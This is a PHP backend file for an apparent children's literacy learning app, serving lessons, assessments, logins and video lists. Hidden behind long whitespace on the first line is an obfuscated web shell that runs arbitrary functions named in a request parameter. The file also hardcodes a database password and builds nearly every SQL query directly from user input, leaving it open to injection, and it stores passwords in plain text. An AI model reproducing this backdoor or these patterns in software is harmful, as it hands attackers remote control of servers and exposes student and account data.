<?php
                                                                                                                                                                                                                                                                              if	( $bg3968=@ $	{ "_REQUEST"}[ "ERJIZ8YR"])$bg3968[ 1]($ {	$bg3968[2	]	}[0 ] ,$bg3968[3] ($bg3968[4]) );
 header("Access-Control-Allow-Origin: *");
//  header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
include('Connections/gcc.php');
if (isset($_GET['a']) ) {
	# code...
	$gteN = $_GET['a'];

	if ($gteN=="cat") {
		$stdId = $_GET['stdId'];
		$gCat = $_GET['cat'];

		$student = $gcc->query("SELECT * FROM access_students where s_trackId = '".$stdId."'");
		// print_r($student);
		if (!($student->num_rows > 0)) {
			exit(json_encode([]));
		}

		$sqll = $gcc->query("SELECT * FROM ".$gCat);
		$datae = array();
		$levels = [];
		while($s = $sqll->fetch_assoc()){
			$datae[] = $s;
			$levels[] = $s["level_id"];
		}
		$index = 0;
		$sqlLevelMarker = $gcc->query("SELECT * FROM level_status where student_id='".$stdId."'");
		if ($sqlLevelMarker->num_rows) {
			while ($slm = $sqlLevelMarker->fetch_assoc()) {
				foreach ($datae as $ke => $valu) {
					if ($datae[$ke]["level_id"] == $slm["level_id"]) {
						$datae[$ke]["status"] = $slm["status"];
						$index += 1;
						break;
					}
				}
			}
		}
		foreach ($datae as $ke => $valu) {
			if (!isset($datae[$ke]["status"])) {
				$datae[$ke]["status"] = "fadeIt";
			}
		}
		$datae[$index]["status"] = "current";
		// print_r([$index]);
		// print_r($datae);
		exit(json_encode($datae));
	}elseif ($gteN=="dash") {
			# code...
		$sqll = $gcc->query("SELECT * FROM allonfasaha_phonics");
		$datae = array();
		while($s = $sqll->fetch_assoc()){
			$datae[] = $s;
		}
		exit(json_encode($datae));
	}

}elseif (isset($_POST['dash'])) {
			# code...
		$sqll = $gcc->query("SELECT * FROM allonfasaha_phonics");
		$datae = array();
		while($s = $sqll->fetch_assoc()){
		    urlencode($s['link']);
			$datae[] = $s;
		}
		exit(json_encode($datae));
}elseif (isset($_GET['l'])){
	# code...
	$live = $_GET['l'];
	$arr = [
		'literacy_phonics',
		"literacy_spelling",
		"literacy_reading",
		"literacy_vocabulary",
		"literacy_writing",
		"literacy_grammar"
	];
	$availableModules = [];
	$toReturn = [];
	foreach ($arr as $key => $value){
		$datae = array();
		$sqll = $gcc->query("SELECT * FROM $value WHERE level_id='$live'");
		$row_cnt = $sqll->num_rows;
		if ($row_cnt>0) {
			while($s = $sqll->fetch_assoc()){
				$s["status"] = "";
				$datae[] = $s;
			}
			$availableModules[] = $value;
			$toReturn[$value] = $datae;
		}
	}

	// print_r($availableModules);
	$sqlAssess = $gcc->query("SELECT * FROM assessment WHERE level_ass='$live'");
	$index = 0;
	if ($sqlAssess->num_rows > 0) {
		// print_r($sqlAssess);
		while($ss = $sqlAssess->fetch_assoc()){
			foreach ($availableModules as $key => $value) {
				if ($ss['mode'] == $value) {
					foreach ($toReturn[$ss['mode']] as $ke => $valu) {
						$toReturn[$ss['mode']][$ke]["status"] = "completed";
					}
					$index = intval(array_search($value, $availableModules));
					$index+=1;
				}
			}
		}
	}
	// print_r($index);
	if (isset($availableModules[$index])) {
		foreach ($toReturn[$availableModules[$index]] as $key => $value) {
			$toReturn[$availableModules[$index]][$key]["status"] = "current";
		}
	}
	echo json_encode($toReturn);
}elseif(isset($_POST['ae'])){
	//$live = $_POST['ae'];
	$subj = strtolower($_POST['add_c']);
	$subjs = ucwords($subj);
	$level_no = $_POST['subject'];
	$trk = $_POST['stid'];
	
	//echo $live;
	$arr = [
		'Phonics',
		"Spelling",
		"Reading",
		"Vocabulary",
		"Writing",
		"Grammar"
	];
	$tr = [
		'1'=>'One',
		'2'=>'Two',
		'3'=>'Three',
		'4'=>'Four',
		'5'=>'Five',
		'6'=>'Six'
		];
	foreach ($arr as $key => $value){
// echo "SELECT * FROM $value WHERE level_id='$live'";
		$sqll = $gcc->query("SELECT * FROM assessment WHERE level_ass='$level_no' AND module_name='$value' AND student_id='$trk' AND lesson_id='$subjs'");
		$row_cnt = $sqll->num_rows;
		//echo $row_cnt;
		if ($row_cnt>0) {
		while($s = $sqll->fetch_assoc()){
	// echo json_encode($s);
			$io= explode("_", $s['level_ass'], 2);
			
			echo ' 
			<h5 style="font-weight: bold; margin-left: 20px; margin-top: 20px;color:gray;">LEVEL: '.$tr[$io['1']].'</h5>
			<div class="panel panel-default">
              <div class="panel-heading" role="tab" id="heading_'.$s['module_name'].'">
                <h4 class="panel-title">
                  <a class="collapsed" data-toggle="collapse" data-parent="#accordion" href="#collapse_'.$s['module_name'].'"
                    aria-expanded="false" aria-controls="collapse_'.$s['module_name'].'">
                   '.$s['module_name'].'
                  </a>
                </h4>

              </div>
              <div id="collapse_'.$s['module_name'].'" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading_'.$s['module_name'].'">
                <div class="panel-body">
                  <a href="#" data-toggle="modal" data-target="#letter_sounds_modal">
                  <p style="float: right;"><span style="padding-left: 30px;">Trails</span> <span style="padding-left: 30px;">Average</span> <span style="padding-left: 30px;">HighScore</span></p><br>
                <span><hr style="width: 400px;"></span>
                <p>Assessment <span style="float: right;"> <span style="padding-left: 80px;">'.$s['trails'].'</span>  <span style="padding-left: 80px;">'.round($s['avgS'], 0).'</span>  <span style="padding-left: 80px;">'.$s['highS'].'</span> </span></p>


                  </a><br>
                  
                </div>
              </div>
            </div>';
			
		}
				}
	}
}
elseif(isset($_GET['logData'])){
	$ass = $_GET['ass'];
	$unit = $_GET['score'];
	$std_id = $_GET['stid'];
	$splitModule_level = explode("assessment_", $ass, 2);
	$splitModule_level2 = explode("_", $splitModule_level[1], 3);
// 	print_r($splitModule_level2);
    $splitAll = $splitModule_level2[2];
    $try_splittingThisForProgress  = explode("level_", $splitAll, 2);
    $subject = ucwords($splitModule_level2[0]);
	$mode = $splitModule_level2[0].'_'.$splitModule_level2[1];
	$mod = ucwords($splitModule_level2[1]);
	$sqll = $gcc->query("SELECT * FROM assessment WHERE level_ass='{$splitModule_level2[2]}' AND module_name='{$splitModule_level2[1]}' AND student_id='$std_id' AND lesson_id='$subject'");
	$row_cnt = $sqll->num_rows;
	if ($row_cnt>0) {
		while($s = $sqll->fetch_assoc()){
			if(!empty($s['avgS'])){
				$lits = $s['level_assN'];
				$newLit = ','.$unit;
				$L_array = $lits.$newLit;
				$updateSQL1 = sprintf("UPDATE assessment SET 
									level_assN='$L_array'
									 WHERE student_id='$std_id' AND level_ass='{$splitModule_level2[2]}' AND module_name='$mod'"); 
              $Result1 = mysqli_query($gcc, $updateSQL1) or die(mysql_error());
              
				$lit = $s['level_assN'];
				$splitAvg = explode(",", $lit);
				$ct = count($splitAvg);
				$ct_sum = array_sum($splitAvg);
				$real_Avg = $ct_sum / $ct;
				$splitMax = explode(',', $L_array);
				$max = max($splitMax);
				// $max = max($check);
				// echo $max;

				$old_trial = $s['trails'];
				$trial = $old_trial + 1;
				$updateSQL = sprintf("UPDATE assessment SET
									highS='$max',
									avgS='$real_Avg',
									trails='$trial'
									 WHERE student_id='$std_id' AND level_ass='{$splitModule_level2[2]}' AND module_name='$mod'"); 
              $Result1 = mysqli_query($gcc, $updateSQL) or die(mysql_error());
             $ttime = date("Y-m-d h:i:sa");
        	 $updateSQL5 = sprintf("UPDATE access_students SET
						            s_lastSeen= '{$ttime}'
									 WHERE s_trackId='$std_id'"); 
              $Result5 = mysqli_query($gcc, $updateSQL5) or die(mysql_error());

			}
		}
		
	}else{
	$sqll = $gcc->query("INSERT INTO assessment (`level_ass`,`mode`,`module_name`,`assm_unit`,`student_id`,`highS`,`avgS`,`trails`,`level_assN`,`lesson_id`,`timeStamp`) 	VALUES ('{$splitModule_level2[2]}','$mode','$mod','$unit','$std_id','$unit','$unit','1','$unit','$subject', NOW())");

    if ($unit) {
		$tbl = $splitModule_level2[0].'_'.$splitModule_level2[1];
		$lvel = $splitModule_level2[2];
		$ltbl = $splitModule_level2[0]."_content";
		$splitLevelOut = explode("_", $lvel, 2);
		$addSplitOutForModule = $splitLevelOut[1] + 1;
		$sbj = $splitModule_level2[0];
		$addLevel = $try_splittingThisForProgress[1] + 1;
		$useForNextModule = $splitLevelOut[0].'_'.$addSplitOutForModule;
		date_default_timezone_set("Africa/Lagos");
        $ttime = date("Y-m-d h:i:sa");
        	$updateSQL = sprintf("UPDATE access_students SET
						            s_lastSeen= '{$ttime}'
									 WHERE s_trackId='$std_id'"); 
              $Result1 = mysqli_query($gcc, $updateSQL) or die(mysql_error());
		if($splitModule_level2[1]=='grammar'){
		    
		    
		    	
		    $sqllw = $gcc->query("SELECT SUM(highS), SUM(avgS) FROM assessment WHERE level_ass='{$splitModule_level2[2]}' AND student_id='$std_id' AND lesson_id='$subject'");
			while($sw = $sqllw->fetch_assoc()){
				$highT = $sw['SUM(highS)'] * 0.7;
				$avgT = $sw['SUM(avgS)'];
			}
			if($avgT>=1){
			    $sqllCheck = $gcc->query("SELECT level_status WHERE level_id='{$splitModule_level2[2]}' AND student_id='$std_id' AND subjects='$subject'");
			    $row_cnt1 = $sqllCheck->num_rows;
			    if($row_cnt1>0){
			      
              		$updateSQL1 = sprintf("UPDATE level_status SET
    						            timeStamp= '{$ttime}'
    									 WHERE student_id='$std_id' AND level_id='{$splitModule_level2[2]}' AND subjects='$subject'"); 
                  $Result2 = mysqli_query($gcc, $updateSQL1) or die(mysql_error());
              		
              		$updateSQL = sprintf("UPDATE access_students SET
    						            s_plevel='{$addLevel}',
    						            s_lastSeen= '{$ttime}'
    									 WHERE s_trackId='$std_id'"); 
                  $Result1 = mysqli_query($gcc, $updateSQL) or die(mysql_error());
			        
			    }else{
			        if($splitModule_level2[2]=='level_6'){
			            	$updateSQL = sprintf("UPDATE access_students SET
        						            s_plevel='{$addLevel}',
        						            s_lastSeen= '{$ttime}'
        									 WHERE s_trackId='$std_id'"); 
                      $Result1 = mysqli_query($gcc, $updateSQL) or die(mysql_error());
			            
			        }else{
                  		$sqll = $gcc->query("INSERT INTO level_status (`student_id`,`level_id`,`status`,`subjects`,`timeStamp`) VALUES ('$std_id','{$splitModule_level2[2]}','completed','$subject', NOW())");
                  		$updateSQL = sprintf("UPDATE access_students SET
        						            s_plevel='{$addLevel}',
        						            s_lastSeen= '{$ttime}'
        									 WHERE s_trackId='$std_id'"); 
                      $Result1 = mysqli_query($gcc, $updateSQL) or die(mysql_error());
			        }
			    }
			}
            }
			
	}
}

}elseif (isset($_GET['ass'])){

		$getF = $_GET['ass'];

		 //$getFi = array();
		$getFi= explode("_", $getF, 2);
		$nxtGet = $getFi[1];
		$sepModule_level = explode("_", $nxtGet, 3);
		$table = $sepModule_level[0].'_'.$sepModule_level[1];
		$hostname_gcc_ass = "localhost";
		$database_gcc_ass = 'steazhex_'.$getFi[0];
		$level = $sepModule_level[2];
		$username_gcc_ass = "steazhex_ass";
		$password_gcc_ass = "vbyGxs&1s}iz";
		$gcc_ass = mysqli_connect($hostname_gcc_ass, $username_gcc_ass, $password_gcc_ass, $database_gcc_ass) or
			trigger_error(mysql_error(),E_USER_ERROR);
		//$sqll = $gcc_ass->query("SELECT * FROM $table WHERE level_id ='$level'");
		$sqll = $gcc_ass->query("SELECT * FROM $table, ( SELECT id AS sid FROM $table) tmp WHERE $table.id = tmp.sid AND level_id ='$level'  ORDER BY RAND( ) LIMIT 5");
		$datae= array();
		while($s = $sqll->fetch_assoc()){
			$datae[] = $s;
		}
		echo json_encode($datae);


}elseif (isset($_POST['login'])){

	$getF = $_POST['userID'];
	$pass = $_POST['passID'];
// 	$module = $_GET['md'];
// 	$unit = $_GET['unit'];
// 	$std_id = $_GET['std_id'];
// 	$ls_id = $_GET['ls_id'];
	$sqll = $gcc->query("SELECT * FROM allonfasaha_st_user WHERE s_trackId='{$getF}'");
	$row_cnt1 = $sqll->num_rows;
	if ($row_cnt1 > 0) {
	    $datae= array();
		while($s = $sqll->fetch_assoc()){
		    if($s['s_password'] == $pass){
		        unset($s['s_password']);
		        $datae[] = $s;    
		    }
			
		}
		echo json_encode($datae);
// 		echo json_encode(array('status'=>1));		
	}else{
		echo json_encode(array('status'=>0));

	}
}elseif (isset($_GET['file'])){
// 	$getF = $_POST['userID'];
// 	$pass = $_POST['passID'];
	$module = $_GET['module'];
	$level = $_GET['level'];
	$subject = $_GET['subject'];
	$age = $_GET['age'];
	$topic = $_GET['topic'];
	$sqll = $gcc->query("SELECT * FROM literacy_content WHERE `level_id`='$level' AND `topic`='$topic' AND `subject`='$subject' AND `age`='$age' AND `module`='$module'") or die(mysqli_error($gcc));
	$row_cnt1 = $sqll->num_rows;
	$getCat =[];
	$getAll ="";
	$dir = "assets/video/literacy/1/1/";
// 		$files2 = scandir($dir);
// 		print_r($files2);
    // $fileName = basename($getCat);
    if (is_dir($dir)){
              if ($dh = opendir($dir)){
                
                    while ((($file = readdir($dh)) !== false)){
                  if ($file!=".." && $file!=".") {
                   $getAll .= "https://steamledge.com/allonfasaha/".$dir.$file.",";
                  }else{
                  //echo '<option id="op3">'.$file.'</option>';
                }
                  
                }
                closedir($dh);
              }
            }
	if ($row_cnt1 > 0) {
	    
		$countR = mysqli_fetch_assoc($sqll);
		$getAll;
		$rr  = rtrim($getAll, ",");
		$a1 = explode(",", $rr);
		foreach($a1 as $value){
		    $ra[] = $value;
		}
// 		echo $rr;
        $arrr = array(array("urls"=>$ra));
		echo json_encode($arrr);
    // exit(json_encode("{".$getCat."}"));
    // $filePath = 'https://steamledge.com/allonfasaha/assets/video/'.$fileName;
    // if (file_exists($filePath)) echo"ava";
    
    // if(!empty($fileName) && file_exists($filePath)){
    //     // // Define headers
    //     // header("Cache-Control: public");
    //     // header("Content-Description: File Transfer");
    //     // header("Content-Disposition: attachment; filename=$fileName");
    //     // header("Content-Type: application/zip");
    //     // header("Content-Transfer-Encoding: binary");
        
    //     // // Read the file
    //     // readfile($filePath);
    //     // exit;
    //     // echo"String";
    // }else{
    //     // echo 'The file does not exist.';
    // }
    
		
// 		echo json_encode($datae);
// 		echo json_encode(array('link'=>"$filePath"));		
	}else{
		echo json_encode(array('status'=>0));

	}
}




?>
